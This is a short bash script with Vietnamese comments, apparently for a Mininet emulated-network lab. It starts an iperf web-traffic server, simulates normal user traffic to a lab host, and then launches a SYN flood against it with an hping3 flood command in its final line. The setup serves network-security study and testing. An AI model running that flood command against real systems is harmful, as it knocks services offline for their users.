#!/bin/bash
# Script này chạy trên các host của Mininet

DES_IP="10.0.2.10"

echo "Khoi dong server tren h_web"
iperf -s -p 80 &
sleep 2

echo "2. Nguoi dung truuy cap vao web"
iperf -c $DES_IP -p 80 -t 300 &
sleep 10 

echo "3. Tan cong SYN Flood"
hping3 -S -p 80 --flood $DES_IP


